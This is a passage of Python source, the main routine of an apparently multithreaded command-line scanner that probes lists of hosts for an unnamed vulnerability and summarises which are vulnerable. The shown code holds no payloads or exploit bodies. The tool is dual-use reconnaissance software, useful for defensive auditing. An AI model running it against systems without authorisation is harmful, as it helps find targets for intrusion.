        for name in ("RED", "GREEN", "YELLOW", "CYAN", "WHITE", "BOLD", "RESET"):
            setattr(Colors, name, "")

    try:
        custom_headers = parse_headers(args.headers)
    except ValueError as exc:
        raise SystemExit(str(exc)) from exc

    loaded_hosts = [args.url] if args.url else load_lines(args.list, "host")
    hosts = deduplicate_hosts(loaded_hosts)
    if not hosts:
        raise SystemExit("No hosts to scan")

    paths: Optional[List[str]] = None
    if args.path_file:
        paths = load_lines(args.path_file, "path")
    elif args.paths:
        paths = args.paths
    if paths == []:
        raise SystemExit("No paths to scan")

    if not args.quiet:
        print_banner()
        print(colorize(f"[*] Loaded {len(hosts)} host(s) to scan", Colors.CYAN))
        if len(hosts) != len(loaded_hosts):
            duplicate_count = len(loaded_hosts) - len(hosts)
            print(
                colorize(
                    f"[*] Skipped {duplicate_count} duplicate host(s)", Colors.CYAN
                )
            )
        if paths:
            print(colorize(f"[*] Testing {len(paths)} custom path(s)", Colors.CYAN))
        else:
            print(colorize(f"[*] Default path: {DEFAULT_PATH}", Colors.CYAN))
        print(colorize(f"[*] Using {args.threads} thread(s)", Colors.CYAN))
        print(colorize(f"[*] Timeout: {args.timeout}s", Colors.CYAN))
        print(colorize(f"[*] SAPI rules: {args.sapi}", Colors.CYAN))
        if args.insecure:
            print(colorize("[!] TLS verification disabled", Colors.YELLOW))
        print()

    verify_ssl = not args.insecure
    results: List[dict] = []
    vulnerable_count = 0
    error_count = 0

    def scan(host: str) -> dict:
        try:
            return check_vulnerability(
                host,
                timeout=args.timeout,
                verify_ssl=verify_ssl,
                custom_headers=custom_headers,
                sapi=args.sapi,
                paths=paths,
                follow_redirects=args.follow_redirects,
            )
        except Exception as exc:  # Keep one bad target from aborting a scan.
            result = base_result(safe_url_label(host))
            result["error"] = f"unexpected error: {exc}"
            result["reason"] = result["error"]
            return result

    if len(hosts) > 1:
        for probe in PROBES:
            build_probe_body(*probe)

    if len(hosts) == 1:
        result = scan(hosts[0])
        results.append(result)
        if not args.quiet or result["vulnerable"] is True:
            print_result(result, args.verbose)
    else:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {executor.submit(scan, host): host for host in hosts}
            with tqdm(
                total=len(hosts),
                desc=colorize("Scanning", Colors.CYAN),
                unit="host",
                ncols=80,
                disable=args.quiet,
            ) as progress:
                for future in as_completed(futures):
                    result = future.result()
                    results.append(result)

                    should_print = result["vulnerable"] is True or (
                        not args.quiet and args.verbose
                    )
                    if should_print:
                        if args.quiet:
                            print_result(result, args.verbose)
                        else:
                            with tqdm.external_write_mode():
                                print_result(result, args.verbose)
                    progress.update(1)

    vulnerable_count = sum(result["vulnerable"] is True for result in results)
    error_count = sum(result["vulnerable"] is None for result in results)
    if not args.quiet:
        print()
        print(colorize("=" * 60, Colors.CYAN))
        print(colorize("SCAN SUMMARY", Colors.BOLD))
        print(colorize("=" * 60, Colors.CYAN))
        print(f"  Total hosts scanned: {len(hosts)}")
        vulnerable_label = f"Vulnerable: {vulnerable_count}"
        if vulnerable_count:
            vulnerable_label = colorize(vulnerable_label, Colors.RED + Colors.BOLD)
        print(f"  {vulnerable_label}")
        print(f"  Not vulnerable: {len(results) - vulnerable_count - error_count}")
        print(f"  Inconclusive/errors: {error_count}")
        print(colorize("=" * 60, Colors.CYAN))

    output_saved = True
    if args.output:
        output_saved = save_results(
            results,
            args.output,
            vulnerable_only=not args.all_results,
            announce=not args.quiet,
        )
    if not output_saved:
        raise SystemExit(2)
    raise SystemExit(1 if vulnerable_count else 0)


if __name__ == "__main__":
    main()
